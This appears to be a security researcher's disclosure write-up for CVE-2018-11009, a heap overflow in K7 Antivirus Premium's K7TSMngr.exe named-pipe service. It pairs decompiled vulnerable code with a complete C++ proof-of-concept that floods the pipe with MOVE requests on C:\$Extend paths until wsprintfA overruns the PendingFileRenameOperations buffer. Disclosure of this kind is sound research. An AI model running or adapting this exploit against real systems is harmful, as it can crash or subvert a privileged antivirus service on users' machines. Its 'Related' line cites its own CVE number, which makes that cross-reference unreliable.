# CVE-2018-11009

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# Related
* This is very a very similar to [CVE-2018-11009](../CVE-2018-11009/readme.md) however was in a different area and ASCII not UNICODE strin ghandling 

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details0
Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x1003E, if you specify **MOVE** with a specially formatted command string, the service will attempt to move a file for you. However if you cause this to fail in certain way, then the code will go into a subroutine and append this move to the *PendingFileRenameOperations* registry key in *HKLM\\System\\CurrentControlSet\\Control\\Session Manager*. It is the appending that is the issue. While there are some length checks in place, it is possible to fill the allocated buffer nearly to the maximum, and then cause a wsprintfA (or two) into that buffer which will corrupt the heap. This requires multiple calls to the API to fill up the registry key, which the PoC demonstrates. The file being opened in the PoC is *C:\\$Extend* as this is an NTFS file which user mode can't open, and generates the required error code to take the vulnerable path.

Note: The logical file operation wasn't raised as a new issue as CVE-2018-11006 effectively encapsulated all the file operations in this routine.  

```C++

// sub_40CC40 Snippet
// Note: pszFile1_1 and pszFile2 come directly from process talking to the pipe. No validation has
// has been performed on these so far.

LABEL_124:
    v64 = MoveFileExA((LPCSTR)pszFile1, pszFile2, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
    goto LABEL_125;
LABEL_125:
    v65 = v64;
    v66 = GetLastError();
    dwLastError = v66;
    if ( v65 )
        return 2;
    if ( v66 != 5 )
        return dwLastError | 0x80000000;
    pszFile2_1 = (int)pszFile2;
    // ...
    pszFile1_1_1 = (int)pszFile1_1;
LABEL_130:
    v55 = SetPendingFileRenameOperationsAscii(pszFile1_1_1, pszFile2_1);


// -------------------------------------------

// aka sub_40CB20
int __cdecl SetPendingFileRenameOperationsAscii(int pszFile1, int pszFile2)
{
    // ... Locals ...
    if ( !RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\Session Manager",
            0,
            0xF003Fu,
            &phkResult) )
    {
        cbData = 0x2000;
        v3 = GetProcessHeap();
        v2 = (BYTE *)HeapAlloc(v3, 0, 0x2000u);
        if ( v2 )
        {
            v4 = (CHAR *)v2;
            if ( !RegQueryValueExA(phkResult, "PendingFileRenameOperations", 0, &Type, v2, &cbData) )
                v4 = (CHAR *)&v2[cbData - 1];
            // VULN: v4 is a pointer into v2 which is a 0x2000 byte heap allocated buffer. If 
            // we just read in 0x1fff characters into this then anything we append will
            // cause a heap overflow. Hence the PoC code hits this multiple times.
            v5 = &v4[wsprintfA(v4, "\\??\\%s", pszFile1)];
            *v5 = 0;
            v6 = v5 + 1;
            if ( a2 )
                // VULN: Same as previous comment.
                v6 += wsprintfA(v6, "\\??\\%s", pszFile2);
            *v6 = 0;
            v7 = v6 + 1;
            *v7 = 0;
            cbData = v7 - v2 + 1;
            if ( !RegSetValueExA(phkResult, "PendingFileRenameOperations", 0, 7u, v2, cbData) )
                v12 = 1;
        }
    }
    if ( phkResult )
        RegCloseKey(phkResult);
    if ( v2 )
    {
        v8 = GetProcessHeap();
     HeapFree(v8, 0, v2);
    }
    return v12;
}
```

# PoC Code
```C++
#include <Windows.h>
#include <stdio.h>

/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	printf("Connected to pipe\r\n");

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}
	printf("WriteFile 1 Success\r\n");

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}
	printf("WriteFile 2 Success\r\n");

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

//
// Vulnerability
//		Type: 
//			Buffer Overflow (Heap) via wsprintfA			
//
//		Description: 
//			
//
void Vuln_BufferOverflow_Heap_sprintf(PSTR pszSource, PSTR pszDest)
{
	PVOID pData = AllocPrecise(0x8000);
	// 0x4D4F5645		MOVE
	DWORD dwAction = 0x4D4F5645;
	memcpy(pData, &dwAction, 4);
	PSTR pszData = (PSTR)(((PBYTE)pData) + 4);

	strcat(pszData, pszSource);
	pszData += strlen(pszSource) + 1;

	strcat(pszData, pszDest);
	pszData += strlen(pszDest) + 1;

	PDWORD pdwData = (PDWORD)pszData;
	*pdwData = 1;

	DWORD dwSize = 4 + strlen(pszSource) + strlen(pszDest) + 2 + 4;


	CallPipeFunction(0x1003E, (PBYTE)pData, dwSize, NULL, 0);

	if (g_hPipe != INVALID_HANDLE_VALUE)
	{
		CloseHandle(g_hPipe);
		g_hPipe = INVALID_HANDLE_VALUE;
	}
}

int wmain(int argc, wchar_t** argv)
{
	printf("Spamming the pipe with some large strings.\r\n. This should fill up the Pending File Rename operations allowing an overflow :o)\r\n");
	for (DWORD i = 0; i < 10000; ++i)
	{
		// So we use .\.\.\. to just fill up a string quicker
		// C:\$Extend is an NTFS file, therefore MoveFileEx will fail with AccessDenied (5) which is what 
		// we need to trigger the overflow
		PSTR pszSource = "C:\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\$Extend";
		PSTR pszDest = "C:\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\$Extend";

		if (i % 100 == 0)
		{
			printf(".");
		}

		Vuln_BufferOverflow_Heap_sprintf(pszSource, pszDest);
	}
}

```